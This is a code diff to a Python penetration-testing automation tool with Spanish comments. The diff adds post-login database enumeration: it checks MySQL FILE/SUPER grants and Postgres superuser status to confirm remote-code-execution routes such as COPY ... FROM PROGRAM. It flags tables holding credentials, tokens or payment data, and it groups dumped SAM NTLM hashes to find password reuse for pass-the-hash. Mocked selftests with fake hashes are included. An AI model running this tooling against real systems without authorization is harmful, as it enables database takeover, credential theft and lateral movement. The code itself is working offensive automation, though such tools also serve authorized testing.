@@ -6039,6 +6039,12 @@ _DB_SYSTEM = {
     "postgres": {"postgres", "template0", "template1"},
 }
 
+# Tablas de ALTO VALOR: lo primero que querrías abrir tras entrar en una BD (#25). Palabra
+# completa-ish por substring (una tabla 'tbl_users' o 'user_accounts' también cuenta).
+_DB_HV_TABLE_RE = re.compile(
+    r"user|credential|passw|secret|admin|account|login|token|api[_-]?key|hash|session|"
+    r"card|payment|bank|ssn|flag|config", re.I)
+
 
 def _parse_mssqlclient_col(out):
     """Valores de una consulta de UNA columna hecha con impacket-mssqlclient por stdin (no-tty):
@@ -6074,6 +6080,16 @@ def _db_enum_mysql(res, ip, port, user, password):
     if rc != 0 or "access denied" in out.lower() or "error 1045" in out.lower():
         return [], {}
     dbs = [l.strip() for l in out.splitlines() if l.strip()]
+    # #24: nivel de privilegio (solo lectura) para CONFIRMAR la ruta de RCE que se sugiere abajo —
+    # FILE habilita LOAD_FILE()/INTO OUTFILE; ALL/SUPER es control total. SHOW GRANTS no modifica nada.
+    rcp, outp = run_capture(base_cmd + ["SHOW GRANTS"], timeout=20, env={"MYSQL_PWD": password}, quiet=True)
+    if rcp == 0 and outp.strip():
+        _step(res, f"mysql -h {ip} -u {user} -e 'SHOW GRANTS'  (MYSQL_PWD=***)", True, outp,
+              note="privilegios de la credencial: FILE → LOAD_FILE()/INTO OUTFILE; ALL/SUPER → control total")
+        _privs = [k for k in ("ALL PRIVILEGES", "FILE", "SUPER") if k in outp.upper()]
+        if _privs:
+            res["findings"].append(("alta", f"MYSQL (cred {user}): privilegio(s) {', '.join(_privs)} — "
+                                    "FILE habilita lectura/escritura de ficheros (LOAD_FILE/INTO OUTFILE, según secure_file_priv); confírmalo"))
     q = ("SELECT table_schema, table_name FROM information_schema.tables "
          "WHERE table_schema NOT IN ('information_schema','mysql','performance_schema','sys') "
          "ORDER BY table_schema, table_name")
@@ -6105,6 +6121,14 @@ def _db_enum_postgres(res, ip, port, user, password):
     if rc != 0 or "authentication failed" in out.lower() or "fatal:" in out.lower():
         return [], {}
     dbs = [l.strip() for l in out.splitlines() if l.strip()]
+    # #24: ¿la credencial es SUPERUSER? (solo lectura) — un superusuario puede 'COPY ... FROM
+    # PROGRAM' = RCE directo, que es la ruta que se sugiere abajo. Confirma antes de sugerirla.
+    rcs, outs = _psql("postgres", "SELECT rolsuper FROM pg_roles WHERE rolname = current_user")
+    if rcs == 0 and outs.strip():
+        _step(res, f"psql -h {ip} -U {user} -c 'SELECT rolsuper …'  (PGPASSWORD=***)", True, outs,
+              note="¿la credencial es superusuario? → COPY ... FROM PROGRAM = RCE directo")
+        if outs.strip().splitlines()[0].strip().lower() in ("t", "true"):
+            res["findings"].append(("alta", f"POSTGRES (cred {user}): es SUPERUSER — COPY ... FROM PROGRAM da RCE directo"))
     tables = {}
     for d in dbs:
         if d.lower() in _DB_SYSTEM["postgres"]:
@@ -6282,6 +6306,12 @@ def _db_enum(res, proto, ip, port, user, password, base, is_hash=False):
         if tbls:
             shown = ", ".join(tbls[:10]) + ("…" if len(tbls) > 10 else "")
             res["findings"].append(("alta", f"{proto.upper()} '{d}': {len(tbls)} tabla(s) — {shown}"))
+    # #25: resalta las tablas de ALTO VALOR (users/credentials/secrets/…) entre todas las de usuario
+    # — son el objetivo directo tras entrar, no hay que buscarlas a ojo entre decenas.
+    _hv = sorted({f"{d}.{t}" for d in user_dbs for t in tables.get(d, []) if _DB_HV_TABLE_RE.search(t)})
+    if _hv:
+        res["findings"].append(("alta", f"{proto.upper()} (cred {user}): tabla(s) de alto valor — "
+                                + ", ".join(_hv[:12]) + (" …" if len(_hv) > 12 else "")))
     if base:
         try:
             outf = Path(base) / f"db_{proto}.txt"
@@ -6976,6 +7006,17 @@ def _dump_sam_lsa(res, nxc, ip, u, p, port=None, dp=None, local_auth=False, is_h
                     f"SAM: hash NTLM de «{acc['user']}» (RID {acc['rid']}): {acc['nt_hash']}"
                     + (" — cuenta integrada normalmente deshabilitada; crackeo offline / PtH solo si está activa"
                        if builtin else " — pass-the-hash o crackeo offline")))
+        # #28: cuentas locales que COMPARTEN el mismo hash NT = MISMA contraseña (reuso) — crackear o
+        # hacer PtH de una vale para todas; y suele significar que esa contraseña es la de un admin
+        # desplegada por imagen/GPO. Se detecta sobre el SAM ya volcado (dato que ya teníamos).
+        _nt_groups = {}
+        for acc in accounts:
+            if not acc["blank"]:
+                _nt_groups.setdefault(acc["nt_hash"].lower(), []).append(acc["user"])
+        for _nt, _accs in _nt_groups.items():
+            if len(_accs) >= 2:
+                res["findings"].append(("alta", f"SAM: {len(_accs)} cuentas locales comparten el MISMO hash NT "
+                                        f"(misma contraseña, reuso) — {', '.join(sorted(_accs))}: crackear/PtH una vale para todas"))
         if pool is not None:   # retroalimentación: cada hash NTLM de SAM vale para pass-the-hash en otros servicios
             for acc in accounts:
                 # NO se reprueba automáticamente: la cuenta de máquina ('$'); el hash de la
@@ -12471,6 +12512,43 @@ def selftest():
     assert any(s == "alta" and "bob" in t and "3c0e5d303ec84884ad5c3b7876a06ea6" in t for s, t in _dfindings)
     assert any(s == "critica" and "frontdesk:Password123" in t for s, t in _dfindings)
     assert any(s == "alta" and "DPAPI" in t for s, t in _dfindings)
+    # #28: dos cuentas locales con el MISMO hash NT (misma contraseña, reuso) → hallazgo de reuso.
+    _sam_reuse = (
+        "SMB x 445 H [*] Dumping SAM hashes\n"
+        "SMB x 445 H alice:1001:aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef:::\n"
+        "SMB x 445 H svc_backup:1002:aad3b435b51404eeaad3b435b51404ee:deadbeefdeadbeefdeadbeefdeadbeef:::\n")
+    def _fake_reuse_sam(cmd, timeout=None, quiet=False, **kw):
+        if "--sam" in cmd:
+            return 0, _sam_reuse
+        return 0, "SMB x 445 H No credentials found"
+    globals()["nxc_bin"], globals()["run_capture"] = (lambda: "FAKE_NXC"), _fake_reuse_sam
+    try:
+        _dres28 = _fp("reuse", "t", [445])
+        _dump_sam_lsa(_dres28, "FAKE_NXC", "10.0.0.1", "bob", "x")
+    finally:
+        globals()["nxc_bin"], globals()["run_capture"] = _real_nxc_bin3, _real_run_capture3
+    assert any(s == "alta" and "MISMO hash NT" in t and "alice" in t and "svc_backup" in t
+               for s, t in _dres28["findings"]), _dres28["findings"]
+
+    # #24/#25: tras login válido de DB, sonda de privilegios (SHOW GRANTS: FILE) y tablas de alto valor.
+    _real_have_db24, _real_rc_db24 = globals()["have"], run_capture
+    def _fake_mysql24(cmd, timeout=None, **kw):
+        q = cmd[-1] if cmd else ""
+        if "schema_name" in q:
+            return 0, "appdb\ninformation_schema"
+        if q == "SHOW GRANTS":
+            return 0, "GRANT SELECT, FILE ON *.* TO 'svc'@'%'"
+        if "information_schema.tables" in q:
+            return 0, "appdb\tusers\nappdb\tproducts\nappdb\tsessions_tokens"
+        return 0, ""
+    globals()["have"], globals()["run_capture"] = (lambda *_a, **_k: True), _fake_mysql24
+    try:
+        _db24 = _fp("reuse-mysql", "x", [3306])
+        _db_enum(_db24, "mysql", "1.2.3.4", 3306, "svc", "pw", None)
+    finally:
+        globals()["have"], globals()["run_capture"] = _real_have_db24, _real_rc_db24
+    assert any(s == "alta" and "FILE" in t and "svc" in t for s, t in _db24["findings"]), _db24["findings"]   # #24
+    assert any(s == "alta" and "alto valor" in t and "appdb.users" in t for s, t in _db24["findings"]), _db24["findings"]   # #25
 
     # --local-auth (palantir): _dump_sam_lsa lo añade a las 3 llamadas (--sam/--lsa/-M lsassy)
     # cuando se pide explícitamente — reutiliza el mismo mock de arriba, _dump_cmds ya tiene
